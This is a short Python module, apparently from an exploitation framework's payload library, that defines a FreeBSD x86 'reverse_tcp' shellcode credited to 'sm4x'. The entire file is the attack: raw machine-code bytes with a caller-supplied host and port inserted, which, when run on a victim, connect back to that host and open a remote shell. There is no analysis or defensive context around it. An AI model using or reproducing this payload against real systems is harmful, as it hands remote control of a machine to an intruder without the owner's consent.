from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "sm4x"
    Shellcode.info["name"] = "FreeBSDx86 - reverse_tcp shellcode"
    Shellcode.info["references"] = [
        "http://shell-storm.org/shellcode/files/shellcode-167.php",
    ]
    Shellcode.info["size"] = 90

    def __init__(self, **kwargs): 
        Shellcode.info["payload"] = [
            r"\x31\xc0\x50\x50\xb0\x17\x50\xcd\x80\x50"
            r"\x6a\x01\x6a\x02\xb0\x61\x50\xcd\x80\x89"
            r"\xc2\x68"
            + kwargs["host"] +
            r"\x68"
            + kwargs["lport"] +
            r"\x89\xe0\x6a\x10\x50\x52\x31\xc0\xb0"
            r"\x62\x50\xcd\x80\x75\x24\xb1\x03\x31\xdb"
            r"\x53\x52\xb0\x5a\x50\xcd\x80\x43\xe2\xf6"
            r"\x31\xc0\x66\x68\x04\x04\x8d\x8c\x24\xfc"
            r"\xfb\xff\xff\x51\x52\xb0\x03\x50\xcd\x80"
            r"\xff\xe1\x31\xc0\x40\x50\x50\xcd\x80"
        ]
